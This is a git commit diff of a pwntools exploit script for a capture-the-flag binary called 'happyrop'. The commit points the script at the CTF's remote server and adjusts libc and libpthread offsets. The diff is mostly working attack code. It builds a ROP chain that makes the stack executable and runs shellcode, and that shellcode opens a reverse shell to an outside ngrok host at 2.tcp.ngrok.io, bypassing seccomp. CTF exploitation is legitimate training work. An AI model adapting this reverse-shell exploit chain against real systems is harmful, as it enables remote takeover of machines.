0e61078341dd798fb47d85afc538b2e8efc71d8f
super_j@att.net <super_j@att.net>
2022-07-21 22:29:40 -0500

    /pwn/happyrop link libseccomp

--- pwn/happyrop/happyrop.py
+++ pwn/happyrop/happyrop.py
@@ -9,8 +9,8 @@ ld = ELF('./ld-2.31.so')
 
 context.binary = e
 
-p = process(e.path)
-#p = remote()
+#p = process(e.path)
+p = remote('litctf.live', 31787)
 
 #funcs
 
@@ -22,17 +22,17 @@ def add(x, y, t = True):
 
 #vars
 
-libp_off = 0x3a230
+libp_off = 0x26230
 strtthread_off = libp.sym['start_thread']
 stkexec_off = libp.sym['__make_stacks_executable']
 
-libc_off = 0x5d230
+libc_off = 0x49230
 strt_off = libc.sym['__libc_start_main']
 nlglolo_off = libc.sym['_nl_global_locale']
 nlupper_off = libc.sym['_nl_C_LC_CTYPE_toupper']
 pthreadexit_off = libc.sym['pthread_exit']
 
-shellcode = shellcraft.connect('2.tcp.ngrok.io', 15282)
+shellcode = shellcraft.connect('2.tcp.ngrok.io', 12134)
 shellcode += shellcraft.dupsh()
 shellcode += shellcraft.exit(0)
 
@@ -59,14 +59,14 @@ add(19, 0x10 * 8 - (libc_off + strt_off + 243), False)
 rop = ROP(libc)
 
 add(37, (libc_off + rop.rdi.address) - (libp_off + strtthread_off + 217))
-add(39, 0x5c900 + rop.rsp.address)
+add(39, (libc_off - 0x930) + rop.rsp.address)
 add(40, -0x90)
 add(280, pthreadexit_off - (nlupper_off + 512))
 add(276, (libp_off + stkexec_off + 32) - (libc_off + nlglolo_off)) #idk why this one has to be last
 
 #add shell code while also calling rop chain which eventually runs shellcode without seccomp
 #use this to connect to shell with ngrok
-
+#gdb.attach(p)
 p.sendlineafter('(y/N)', asm(shellcode))
 
 #pray for flag
